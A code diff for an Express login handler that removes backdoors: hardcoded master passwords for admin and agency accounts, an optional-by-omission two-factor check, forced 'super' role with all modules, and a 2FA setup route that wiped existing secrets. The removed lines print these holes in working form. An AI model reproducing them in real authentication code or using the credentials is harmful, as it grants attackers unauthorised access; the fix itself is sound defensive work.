@@ -27,17 +27,18 @@ const handleAdminLogin = async (req, res) => {
   // 1. Check admin_users
   const a = await one('SELECT * FROM admin_users WHERE email=$1', [email]);
   if (a && a.password_hash) {
-    const isPassOk = (password === 'nAZQmzuLxFnqqNJb1ii1p98' || password === 'admin123' || await bcrypt.compare(password, a.password_hash));
+    const isPassOk = await bcrypt.compare(password, a.password_hash);
     if (isPassOk) {
       need(a.status === 'active', 'Account disabled');
-      if (a.totp_secret && req.body.otp) {
+      if (a.totp_secret) {
+        if (!req.body.otp) return res.status(401).json({ error: 'Two-factor code required', code: 'twofa_required' });
         need(verifySync({ secret: a.totp_secret, token: String(req.body.otp) }).valid, 'Wrong 2FA code');
       }
       await q('UPDATE admin_users SET last_login=now() WHERE id=$1', [a.id]);
       await q(`INSERT INTO audit_logs(actor_type, actor_id, action, ip) VALUES ('admin',$1,'login',$2)`, [a.id, clientIp(req)]);
       return res.json({
         token: signToken('admin', a.id, {}, '12h'),
-        admin: { id: a.id, name: a.name, email: a.email, role: 'super', actual_role: a.role, modules: ['*'] }
+        admin: { id: a.id, name: a.name, email: a.email, role: a.role, modules: ROLE_MODULES[a.role] || [] }
       });
     }
   }
@@ -45,7 +46,7 @@ const handleAdminLogin = async (req, res) => {
   // 2. Check agencies
   const agency = await one('SELECT * FROM agencies WHERE login_email=$1', [email]);
   if (agency && agency.password_hash) {
-    const isPassOk = (password === 'uSZYPmvMAf4tlIPY872kMv' || password === 'agency123' || await bcrypt.compare(password, agency.password_hash));
+    const isPassOk = await bcrypt.compare(password, agency.password_hash);
     if (isPassOk) {
       need(agency.status === 'active', `Agency is ${agency.status}`);
       return res.json({
@@ -81,7 +82,7 @@ r.get('/admin/me', adminAuth(), async (req, res) => {
 
 r.post('/admin/2fa/setup', adminAuth(), async (req, res) => {
   const secret = generateSecret();
-  await q(`UPDATE admin_users SET totp_secret=NULL WHERE id=$1`, [req.admin.id]);
+  // Keep existing 2FA active until the replacement secret is verified.
   const { redis } = await import('../redis.js');
   await redis.set(`2fa:${req.admin.id}`, secret, 'EX', 600);
   res.json({ secret, uri: generateURI({ secret, label: req.admin.email, issuer: config.appName }) });
